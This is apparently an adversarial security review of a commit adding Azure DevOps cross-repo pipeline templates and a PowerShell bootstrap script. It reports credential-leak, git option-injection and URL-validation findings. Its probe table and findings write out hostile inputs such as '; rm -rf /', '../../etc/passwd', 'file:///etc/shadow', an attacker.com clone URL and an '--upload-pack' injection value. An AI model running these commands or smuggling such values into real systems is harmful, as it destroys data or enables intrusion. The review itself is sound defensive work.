# Piece 30 Adversarial Review — RETRO (Security)

**Reviewer:** RETRO (Security)
**Commit reviewed:** `10168051` on `squad/piece-30-ado-cross-repo-templates`
**Date:** 2026-06-02
**Implementer:** Flight (excluded from this review)

---

**Verdict:** APPROVE-WITH-NITS
**Severity counts:** Critical: 0 | High: 1 | Medium: 2 | Low: 4
**Mandatory findings:** 3
**Non-blocking findings:** 4

---

## Summary

The three ADO templates and bootstrap script are structurally sound. Input validation on `$DeveloperAlias` is correct and enforced before any write. The fold pipeline correctly scopes `SYSTEM_ACCESSTOKEN` as a step-level env injection with no pool-level broad OAuth grant. The trust boundary is architecturally coherent. Three surgical fixes are required before merge: the bootstrap script unconditionally echoes `$DocsRepoUrl` to console (PAT-in-URL leak path), is missing the team-established `--` separator before URL arguments in `git clone`, and accepts arbitrary URL schemes including `file://` without validation. None of these are architectural — all can be fixed in-place with under ten lines of changes.

---

## Mandatory (M1, M2, M3)

### M1 — Write-Host echoes `$DocsRepoUrl` verbatim to console/pipeline log
**Where:** `bootstrap-cross-repo.ps1` line 108
```powershell
Write-Host "[3/5] Adding remote '$DocsRemoteName' → $DocsRepoUrl ..."
```
**Also affected:** `publish-inbox.yml` passes `$(docsRepoUrl)` as a command-line argument to `pwsh -File bootstrap.ps1`. ADO logs command arguments. If `docsRepoUrl` contains an embedded PAT (`https://user:PAT@dev.azure.com/…`), the token appears in:
1. The ADO step's command-line log (from the `pwsh -File` invocation)
2. The `Write-Host` output at step 3 of the bootstrap script

**Severity:** High
**Why blocks:** PAT-embedded URLs are a documented enterprise ADO pattern. The script has no comment warning against them. A developer who follows common ADO docs and passes `https://PAT@dev.azure.com/org/proj/_git/docs` will leak their token in plaintext to pipeline logs. This violates the secret-handling skill's core principle: credentials must never be written to observable output.
**Suggested fix:** Remove `$DocsRepoUrl` from all `Write-Host` messages. Log only the remote name and resolved `$TeamRoot` path — not the URL. Add a param-block comment: `# IMPORTANT: Never embed credentials in DocsRepoUrl. Use SSH keys or ADO service connections.`

---

### M2 — Missing `--` separator before `$DocsRepoUrl` in `git clone`
**Where:** `bootstrap-cross-repo.ps1` line 89
```powershell
git clone "$DocsRepoUrl" "$TeamRoot"
```
**Severity:** Medium
**Why blocks:** The team established the `git --` separator convention in piece 14 (RETRO history, 2026-05-18): "Revision commit 1a47e601 added `--` separator to all git subprocess calls (clone, fetch, checkout)." `$DocsRepoUrl` is not format-validated. A URL beginning with `--` (e.g., `--upload-pack=evil-script`) would be parsed by git as an option flag, not a URL. On a developer workstation this is a social-engineering vector; in a pipeline where `$(docsRepoUrl)` comes from a shared variable library it is a privilege-escalation vector.
**Suggested fix:**
```powershell
git clone -- "$DocsRepoUrl" "$TeamRoot"
```
The `--` form is the team convention. Apply to all `git clone` calls.

---

### M3 — No URL scheme validation on `$DocsRepoUrl`
**Where:** `bootstrap-cross-repo.ps1` — no validation block for DocsRepoUrl beyond null/whitespace check
**Severity:** Medium
**Why blocks:** Two hostile probes reach live git calls without rejection (see SAFE-FAIL section). A `file://` URL causes git to attempt cloning from the local filesystem — this fails on non-repo paths but the URL is echoed to logs first (M1 compound). An `https://attacker.com/.git` URL causes a blind clone against an attacker-controlled server that can serve malicious git objects or hooks. In a pipeline context, `$(docsRepoUrl)` is set by an admin, which limits practical exploitability — but the script is also documented as a developer workstation tool, where the risk is higher.
**Suggested fix:** Add a scheme allowlist check immediately after the null/whitespace guards:
```powershell
if ($DocsRepoUrl -notmatch '^(https?://|git\+ssh://|ssh://|git@)') {
    Write-Error "DocsRepoUrl scheme not allowed. Use HTTPS or SSH. Got: '$($DocsRepoUrl.Split('//')[0])://...'"
    exit 1
}
```
Do NOT include the full URL in the error message (respects M1 fix). Reject `file://` explicitly.

---

## Non-blocking (N1, N2, N3, N4)

### N1 — Sole-writer invariant is convention + doc guidance; no technical enforcement layer
**Where:** `fold-squad-state.yml` header comment; `docs/src/content/docs/features/state-backends.md` "Pipeline identity and branch policies" section
**Severity:** Medium
**Why non-blocking:** `state-backends.md` correctly states: "Block direct pushes — on for all identities except the fold pipeline's service account." The `team-state-storage.md` checklist includes the branch policy checkbox. These are recommendations. A developer with push rights on the docs repo who bypasses the recommended policy can write directly to `squad-state`. There is no CI gate that validates the branch policy is set before the fold pipeline activates. The mitigation gap is documented but not enforced.
**Note:** This is a known design position (spec piece 30, Notes section: "There is no runtime lock; the pipeline permission model (repo-scoped identity) is the enforcement mechanism."). Flag for a future governance piece that adds a preflight check.

---

### N2 — `persistCredentials: true` comment is misleading about OAuth token scope
**Where:** `fold-squad-state.yml` — fast-forward step comment: `# OAuth token access is scoped to this step only.`
**Severity:** Low
**Why non-blocking:** The `SYSTEM_ACCESSTOKEN` env injection IS correctly scoped to the fast-forward step only (no pool-level `allowScripts`). This satisfies the spec. However, `persistCredentials: true` on the checkout step stores the ADO OAuth credential in the git credential helper for the **entire job**, not just the push step. Any `git` call in any subsequent step can authenticate using that credential. The comment implies step-level scoping that doesn't match how `persistCredentials` works. This is not exploitable from outside (the steps are fixed by the template), but it misleads operators who read the template.
**Suggested fix:** Replace the comment with: `# SYSTEM_ACCESSTOKEN env var is scoped to this step only. Note: persistCredentials (from checkout) makes the git credential helper available job-wide — this is required for git push to succeed.`

---

### N3 — `cat .squad/publish-history.json` in report step logs fold provenance to pipeline console
**Where:** `fold-squad-state.yml` — "Report fold results" step
```yaml
cat .squad/publish-history.json || echo "(no history file yet)"
```
**Severity:** Low
**Why non-blocking:** The history file contains developer aliases, inbox branch names, fold timestamps, and fold commit SHAs. None of these are secrets (aliases are already in branch names; SHAs are public). However, if future pieces enrich `publish-history.json` with additional provenance fields (e.g., session metadata), this unconditional `cat` will leak those fields to pipeline logs without review. Log only a summary (count of folded refs, fold timestamp) rather than the full JSON.

---

### N4 — `.git/info/exclude` masking `.squad/` from `git status` could delay detection of accidentally staged secrets
**Where:** `bootstrap-cross-repo.ps1` step 4 — appends `.squad/` to `.git/info/exclude`
**Severity:** Low
**Why non-blocking:** `.git/info/exclude` suppresses `.squad/` from `git status` untracked output — intentional behavior. The risk: a developer who creates a secret file at `.squad/creds.txt` will not see it listed as untracked in `git status`. If they then `git add .squad/creds.txt` explicitly, the file WILL be staged and committed — Scribe's pre-commit scanner (secret-handling skill) provides the next-layer guard. The risk is real but the secret-handling skill already addresses it. Worth adding a single-line inline comment in the script: `# .squad/ is excluded from git status untracked output by design — use 'git ls-files --others --ignored' to audit.`

---

## Hostile-input probes (SAFE-FAIL)

| Input | Predicted behavior (from static read) | Result |
|---|---|---|
| `$DeveloperAlias = "; rm -rf /"` | Regex `'^[a-z][a-z0-9-]{0,38}$'` fails on `;`, space, `/`. Script exits with `Write-Error` before any write. No git call made. | ✅ SAFE-FAIL |
| `$DeveloperAlias = "../../etc/passwd"` | Regex fails on `.` and `/`. Script exits at validation block before any write. | ✅ SAFE-FAIL |
| `$DocsRepoUrl = "file:///etc/shadow"` | No URL validation. Write-Host step 1 echoes `$TeamRoot` path (not DocsRepoUrl). `git clone "file:///etc/shadow" "$TeamRoot"` attempted — fails because `/etc/shadow` is a file, not a git repo. However, if the remote doesn't already exist, Write-Host at step 3 **echoes the `file:///etc/shadow` string to logs** (M1). Clone failure propagates as error (ErrorActionPreference=Stop). | ⚠️ PARTIAL: clone FAILS, but URL LEAKED in log (M1). |
| `$DocsRepoUrl = "https://attacker.com/.git"` | No URL validation (M3 gap). `git clone -- "https://attacker.com/.git" "$TeamRoot"` would be attempted (with M2 fix applied). If attacker server serves valid git objects, clone succeeds. Attacker repo could contain malicious hooks in `.git/hooks/` that run on subsequent git operations. Without the M2+M3 fixes, also missing `--` separator. Write-Host echoes the URL (M1). | ❌ NOT SAFE-FAIL: blind clone proceeds. URL also logged. |
| `.git/info/exclude` alias injection (e.g., alias containing `\nmalicious-entry`) | Alias validated by `'^[a-z][a-z0-9-]{0,38}$'` — newlines and backslashes rejected. Exclude entries are from a hardcoded array `@('.squad/', '.github/agents/squad.agent.md')` unrelated to alias. No alias-to-exclude interpolation path exists. | ✅ SAFE-FAIL |

---

## Trust-boundary analysis

```
Developer workstation
  → bootstrap-cross-repo.ps1 (WORK_ROOT setup)
  → squad sync --push
  → squad/inbox/<alias>/<session> branch on docs repo

publish-inbox.yml (product repo pipeline)
  → triggers on squad/inbox/** branch pushes
  → runs bootstrap if absent
  → squad sync --push (publishes to docs repo inbox)
  ❌ No content validation of what squad sync pushes
  ❌ Any developer with push rights to docs repo can create squad/inbox/* branches

fold-squad-state.yml (docs repo pipeline — sole writer)
  → triggers on squad/inbox/** pushes
  → git fetch all inbox refs
  → squad fold (enumerates and folds inbox branches)
  ❌ No content validation of inbox branch content before folding
  ❌ A developer can push arbitrary .squad/ content to their inbox branch that gets folded into squad-state
  → git push origin HEAD:squad-state  [SYSTEM_ACCESSTOKEN scoped to this step]
  → squad-state updated

squad-state branch
  ← Sole write path: fold-squad-state.yml pipeline identity
  ⚠️ Branch policy enforcement is documentation-only (N1) — not a hard technical gate from this commit
```

**Gaps:**
1. No content validation of inbox branches before fold. Trust is implicit — any developer with docs repo push access is trusted to publish only legitimate squad state. This is by design but worth noting as a future governance surface.
2. Branch policy recommendation enforcing sole-writer invariant is not verifiable from CI. A preflight check (e.g., a pipeline step that queries ADO branch policies and fails if the policy is absent) would close this gap.
3. The `docsRepoUrl` pipeline variable in `publish-inbox.yml` is declared without `isSecret: true`, so ADO will not mask it in logs. If it contains credentials, they appear in the ADO run log for the bootstrap step. Recommend declaring it secret in the pipeline definition.

---

## Identity & credential hygiene scan

- `git config user.email "squad-fold-pipeline@squad.local"` — fake local-domain address, not a real email. Not PII. ✅
- No `_email` strings or credential-shaped values in any template or doc.
- No `$(SecretName)` macro references that echo to console in `displayName` strings.
- `SYSTEM_ACCESSTOKEN` is injected via `env:` on the fast-forward step only — not in any `displayName` or `echo` call. ✅

---

## Docs review (security clarity)

| Doc | Pipeline identity stated? | PAT-in-URL warning? | Trust boundary explained? |
|---|---|---|---|
| `docs/guide/shared-squad.md` | Mentions fold pipeline as sole writer; no pipeline identity requirement stated explicitly | ❌ No warning | Partial — mentions fold pipeline as sole writer |
| `docs/features/state-backends.md` | ✅ "Pipeline identity and branch policies" section; branch policy recommendations | ❌ No warning | ✅ Good — fold invariant and branch policies documented |
| `docs/scenarios/team-state-storage.md` | Checklist includes branch policy checkbox | ❌ No warning | ✅ Checklist covers it |

**Finding:** No doc warns that `DocsRepoUrl` must never contain embedded credentials. Given M1 (the script echoes the URL), this documentation gap compounds the risk. Add a callout box in all three docs: "Never embed credentials (PATs) in `DocsRepoUrl`. Use SSH keys or ADO service connections for authentication."
